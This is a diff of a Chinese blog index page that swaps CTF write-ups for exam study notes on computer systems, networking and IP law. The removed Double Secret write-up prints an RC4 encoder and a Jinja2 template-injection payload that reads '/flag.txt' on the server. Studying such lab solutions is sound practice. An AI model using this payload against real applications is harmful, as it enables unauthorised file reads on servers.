-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192157802.png" alt="image-20240619215755771"></p>
-<p>拿到flag</p>
+            <h3 id="计算机系统组成"><a href="#计算机系统组成" class="headerlink" title="计算机系统组成"></a>计算机系统组成</h3><h4 id="冯诺依曼计算机的特点"><a href="#冯诺依曼计算机的特点" class="headerlink" title="冯诺依曼计算机的特点"></a>冯诺依曼计算机的特点</h4><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040120376.png" alt="image-20240904012040338"></h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040120837.png" alt="image-20240904012051808"></p>
+<p>输入输出设备和存储器之间道德数据传送通过运算器完成</p>
+<h4 id="五大部件作用"><a href="#五大部件作用" class="headerlink" title="五大部件作用"></a>五大部件作用</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040121711.png" alt="image-20240904012152683"></p>
+<h4 id="主存储器"><a href="#主存储器" class="headerlink" title="主存储器"></a>主存储器</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040123787.png" alt="image-20240904012312719"></p>
+<p>mar可以标记存储单元的个数</p>
+<p>mdr可以标记每个存储单元中存储元的个数</p>
+<h4 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040127941.png" alt="image-20240904012753882"></p>
+<h4 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040129573.png" alt="image-20240904012933519"></p>
+<h4 id="Flynn分类法"><a href="#Flynn分类法" class="headerlink" title="Flynn分类法"></a>Flynn分类法</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040132415.png" alt="image-20240904013203366"></p>
+<h3 id="指令系统"><a href="#指令系统" class="headerlink" title="指令系统"></a>指令系统</h3><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040133832.png" alt="image-20240904013337788"></p>
+<p>操作码：决定干什么</p>
+<p>地址码：决定干谁</p>
+<h4 id="七种寻址方式"><a href="#七种寻址方式" class="headerlink" title="七种寻址方式"></a>七种寻址方式</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040136006.png" alt="image-20240904013623976"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040136153.png" alt="image-20240904013635129"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040137098.png" alt="image-20240904013713046"></p>
+<p>出题类型：给出特点选择相应寻址方式，所以了解即可</p>
+<h4 id="指令的流水处理"><a href="#指令的流水处理" class="headerlink" title="指令的流水处理"></a>指令的流水处理</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040140854.png" alt="image-20240904014034806"></p>
+<p>多线程</p>
+<h4 id="流水线的计算"><a href="#流水线的计算" class="headerlink" title="流水线的计算"></a>流水线的计算</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040141354.png" alt="image-20240904014151305"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040142329.png" alt="image-20240904014255275"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040143551.png" alt="image-20240904014329499"></p>
+<h3 id="输入输出技术"><a href="#输入输出技术" class="headerlink" title="输入输出技术"></a>输入输出技术</h3><p>cpu与外设之间的数据传送方式</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040144085.png" alt="image-20240904014424029"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040144172.png" alt="image-20240904014449130"></p>
+<h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><h4 id="层次结构"><a href="#层次结构" class="headerlink" title="层次结构"></a>层次结构</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040450824.png" alt="image-20240904045051756"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040451598.png" alt="image-20240904045147537"></p>
+<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040453081.png" alt="image-20240904045331031"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040454494.png" alt="image-20240904045421433"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040455819.png" alt="image-20240904045507755"></p>
+<h4 id="高速缓存cache"><a href="#高速缓存cache" class="headerlink" title="高速缓存cache"></a>高速缓存cache</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040456306.png" alt="image-20240904045601250"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040457783.png" alt="image-20240904045712721"></p>
+<h4 id="cache的三种地址映像"><a href="#cache的三种地址映像" class="headerlink" title="cache的三种地址映像"></a>cache的三种地址映像</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409040458856.png" alt="image-20240904045801798"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050003230.png" alt="image-20240905000304123"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050004241.png" alt="image-20240905000430176"></p>
+<h4 id="cache的性能分析"><a href="#cache的性能分析" class="headerlink" title="cache的性能分析"></a>cache的性能分析</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050006708.png" alt="image-20240905000627679"></p>
+<h4 id="主存的扩展"><a href="#主存的扩展" class="headerlink" title="主存的扩展"></a>主存的扩展</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050009799.png" alt="image-20240905000924744"></p>
+<h4 id="虚拟存储器"><a href="#虚拟存储器" class="headerlink" title="虚拟存储器"></a>虚拟存储器</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050015587.png" alt="image-20240905001524545"></p>
+<h4 id="磁盘存储器"><a href="#磁盘存储器" class="headerlink" title="磁盘存储器"></a>磁盘存储器</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050016495.png" alt="image-20240905001631443"></p>
+<h3 id="总线系统"><a href="#总线系统" class="headerlink" title="总线系统"></a>总线系统</h3><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050017811.png" alt="image-20240905001757727"></p>
+<h3 id="磁盘阵列技术"><a href="#磁盘阵列技术" class="headerlink" title="磁盘阵列技术"></a>磁盘阵列技术</h3><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050019136.png" alt="image-20240905001927079"></p>
+<h3 id="计算机可靠性"><a href="#计算机可靠性" class="headerlink" title="计算机可靠性"></a>计算机可靠性</h3><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409050021771.png" alt="image-20240905002106723"></p>
 
             
         </div>
@@ -604,12 +682,12 @@
         
         
     </div>
-    <a href="/2024/06/19/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/October-2019-Twice-SQL-Injection/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/19/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/">
-        <h2 class="post-title">[CISCN2019 华东南赛区]Double Secret</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -617,7 +695,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/19
+            2024/10/23
         </span>
         
         
@@ -625,28 +703,19 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137333.png" alt="image-20240619213707600"></p>
-<p>我们首先访问一下screct页面</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192137126.png" alt="image-20240619213758089"></p>
-<p>要我们说secret，猜测是传参数secret</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192138993.png" alt="image-20240619213851969"></p>
-<p>传1进去是d</p>
-<p>传参传长一点试试</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139377.png"></p>
-<p>发现报错，在其中发现源码泄露</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192139280.png" alt="image-20240619213957241"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret==None):</span><br><span class="line">        return &#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span><br><span class="line">    rc=rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"> </span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"> </span><br><span class="line">    if &#x27;ciscn&#x27; in a.lower():</span><br><span class="line">Open an interactive python shell in this frame        return &#x27;flag detected!&#x27;</span><br><span class="line">    return a</span><br></pre></td></tr></table></figure>
-
-<p>所以，我们可以发现传进去的参数是被使用rc4解密了，所以我们应该将要传进去的内容进行加密</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">def rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):</span><br><span class="line">    # print(&quot;RC4加密主函数&quot;)</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    return  crypt</span><br><span class="line">def rc4_init_sbox(key):</span><br><span class="line">    s_box = list(range(256))  </span><br><span class="line">    # print(&quot;原来的 s 盒：%s&quot; % s_box)</span><br><span class="line">    j = 0</span><br><span class="line">    for i in range(256):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % 256</span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span><br><span class="line">    return s_box</span><br><span class="line">def rc4_excrypt(plain, box):</span><br><span class="line">    # print(&quot;调用加密程序成功。&quot;)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = 0</span><br><span class="line">    for s in plain:</span><br><span class="line">        i = (i + 1) % 256</span><br><span class="line">        j = (j + box[i]) % 256</span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % 256</span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = &quot;&quot;.join(res)</span><br><span class="line">    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))</span><br><span class="line">    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span><br><span class="line">rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>rc4加密脚本如上</p>
-<p>最后得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</span><br></pre></td></tr></table></figure>
-
-<p>将其上传为secret参数</p>
-<p>得到flag</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406192145367.png" alt="image-20240619214531334"></p>
+            <h3 id="计算机网络基础"><a href="#计算机网络基础" class="headerlink" title="计算机网络基础"></a>计算机网络基础</h3><h4 id="考纲要求"><a href="#考纲要求" class="headerlink" title="考纲要求"></a>考纲要求</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241940194.png" alt="image-20240924194045015"></p>
+<h4 id="计算机网络的分类"><a href="#计算机网络的分类" class="headerlink" title="计算机网络的分类"></a>计算机网络的分类</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241941445.png" alt="image-20240924194121407"></p>
+<h4 id="七层网络体系结构！！！"><a href="#七层网络体系结构！！！" class="headerlink" title="七层网络体系结构！！！"></a>七层网络体系结构！！！</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241941326.png" alt="image-20240924194156271"></p>
+<h4 id="网络的标准"><a href="#网络的标准" class="headerlink" title="网络的标准"></a>网络的标准</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241944993.png" alt="image-20240924194411949"></p>
+<h4 id="TCP-IP协议族！！！"><a href="#TCP-IP协议族！！！" class="headerlink" title="TCP&#x2F;IP协议族！！！"></a>TCP&#x2F;IP协议族！！！</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241946054.png" alt="image-20240924194612931"></p>
+<h4 id="TCP-UDP辨析"><a href="#TCP-UDP辨析" class="headerlink" title="TCP&#x2F;UDP辨析"></a>TCP&#x2F;UDP辨析</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241948439.png" alt="image-20240924194843372"></p>
+<h4 id="IP地址和IPv6简介"><a href="#IP地址和IPv6简介" class="headerlink" title="IP地址和IPv6简介"></a>IP地址和IPv6简介</h4><h5 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241949544.png" alt="image-20240924194927491"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241949976.png" alt="image-20240924194934953"></p>
+<h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241949280.png" alt="image-20240924194947239"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241950589.png" alt="image-20240924195025493"></p>
+<h5 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241951241.png" alt="image-20240924195141154"></p>
+<h6 id="小tip"><a href="#小tip" class="headerlink" title="小tip"></a>小tip</h6><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241953518.png" alt="image-20240924195315486"></p>
+<h4 id="Internet服务！！！"><a href="#Internet服务！！！" class="headerlink" title="Internet服务！！！"></a>Internet服务！！！</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241953458.png" alt="image-20240924195348323"></p>
 
             
         </div>
@@ -656,12 +725,12 @@
         
         
     </div>
-    <a href="/2024/06/19/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/17/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/WUSTCTF2020-%E4%BD%9B%E8%AF%B4%EF%BC%9A%E5%8F%AA%E8%83%BD%E5%9B%9B%E5%A4%A9/">
-        <h2 class="post-title">[WUSTCTF2020]佛说：只能四天</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84%E4%B8%8E%E6%A0%87%E5%87%86%E5%8C%96%E7%9F%A5%E8%AF%86/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -669,7 +738,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/17
+            2024/10/23
         </span>
         
         
@@ -677,22 +746,15 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑</p>
-<p>佛曰密码</p>
-<p>都想起来哩</p>
-<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/Buddha.html">新约佛论禅&#x2F;佛曰加密 - 萌研社 - PcMoe!</a></p>
-<p>平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等</p>
-<p>得到这个</p>
-<p><a target="_blank" rel="noopener" href="https://www.zaixianjisuan.com/jiamijiemi/shehuizhuyihexinjiazhiguanjiami.html">社会主义核心价值观加密计算器 - 在线计算网 (zaixianjisuan.com)</a></p>
-<p>好密码！！！</p>
-<p>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</p>
-<p>开始了</p>
-<p>但是后面，栅栏密码</p>
-<p><a target="_blank" rel="noopener" href="https://www.metools.info/code/fence154.html">栅栏密码_栅栏密码在线加密解密【W型】-ME2在线工具 (metools.info)</a></p>
-<p>两次栅栏，出现了</p>
-<p>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar</p>
-<p>所以是凯撒！！!</p>
-<p>三位的凯撒，接base32的解码，得到flag！！！</p>
+            <h3 id="法律法规与标准化知识"><a href="#法律法规与标准化知识" class="headerlink" title="法律法规与标准化知识"></a>法律法规与标准化知识</h3><h4 id="知识产权"><a href="#知识产权" class="headerlink" title="知识产权"></a>知识产权</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232018846.png" alt="image-20241023201843656"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232019038.png" alt="image-20241023201902973"></p>
+<h5 id="保护期限"><a href="#保护期限" class="headerlink" title="保护期限"></a>保护期限</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232019187.png" alt="image-20241023201949098"></p>
+<h5 id="知识产权人的确定"><a href="#知识产权人的确定" class="headerlink" title="知识产权人的确定"></a>知识产权人的确定</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232021587.png" alt="image-20241023202134509"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232023073.png" alt="image-20241023202315005"></p>
+<h5 id="侵权判定"><a href="#侵权判定" class="headerlink" title="侵权判定"></a>侵权判定</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232024930.png" alt="image-20241023202406785"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232024399.png" alt="image-20241023202434297"></p>
+<h4 id="标准的分类和标准的编号"><a href="#标准的分类和标准的编号" class="headerlink" title="标准的分类和标准的编号"></a>标准的分类和标准的编号</h4><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232025531.png" alt="image-20241023202511461"></p>
+<h5 id="编号"><a href="#编号" class="headerlink" title="编号"></a>编号</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232026608.png" alt="image-20241023202600542"></p>
 
             
         </div>
@@ -702,7 +764,7 @@
         
         
     </div>
-    <a href="/2024/06/17/buu%E5%88%B7%E9%A2%98%E9%9B%86-crypto/WUSTCTF2020-%E4%BD%9B%E8%AF%B4%EF%BC%9A%E5%8F%AA%E8%83%BD%E5%9B%9B%E5%A4%A9/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84%E4%B8%8E%E6%A0%87%E5%87%86%E5%8C%96%E7%9F%A5%E8%AF%86/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -717,7 +779,7 @@
     
     
     <span class="page-omit">...</span>
-    <a class="page-num" href="/page/10">10</a>
+    <a class="page-num" href="/page/12">12</a>
     
     
     <a class="page-num" href="/page/2/">
